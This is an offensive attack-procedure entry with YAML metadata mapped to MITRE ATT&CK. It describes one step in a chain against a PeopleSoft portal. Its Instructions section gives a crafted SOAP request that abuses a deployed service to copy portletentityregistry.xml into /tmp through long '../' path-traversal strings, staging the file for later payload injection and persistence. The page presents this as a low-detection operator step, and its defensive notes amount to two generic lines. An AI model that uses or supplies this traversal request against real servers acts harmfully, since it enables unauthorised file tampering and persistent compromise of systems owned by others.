---
tags:
  - file-copy
  - path-traversal
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/post-soap-copy-to-temp]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Server Software Component]]'
skill_level: advanced
impact_level: medium
detection_risk: low
sub_techniques: []
id: f2fc2f1c-75c5-4b6d-acad-f2e23a43a3c1
created_at: '2025-12-13T09:00:33.632Z'
updated_at: '2025-12-13T09:00:33.632Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Server Software Component]]'
---
# Copy XML to Temp Directory

## Summary

This procedure uses a deployed service to copy an XML file to a temporary directory via path traversal, setting up for payload injection.

## Description

After deploying the service, a SOAP request is sent to copy portletentityregistry.xml to /tmp using relative path traversal, allowing modification in a writable location.

## Requirements

1. Deployed service from prior step
2. Access to /pspc/services/lmJyaVBUrfcEfJw
3. SOAP request crafting capability

## Defense

Defensive measures and detection strategies:

- Restrict file operations in services
- Monitor for path traversal patterns in logs

## Objectives

1. Prepare XML file for modification
2. Enable payload injection
3. Maintain persistence in chain

## Instructions

### Step 1: Send Copy Request

**Context**: Copy the file using SOAP API.

**Command** ([[commands/post-soap-copy-to-temp]]):
```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
...
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:copy ...>
<in0 xsi:type="xsd:string">./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml</in0>
<in1 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in1>
</api:copy>
</soapenv:Body>
</soapenv:Envelope>
```

> This copies the file to the temp directory using traversal.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Server Software Component]]

### Sub-Techniques



## Commands Used

- [[commands/post-soap-copy-to-temp]]

## Tools Used

- [[tools/curl]]

## Tags

- file-copy
- path-traversal
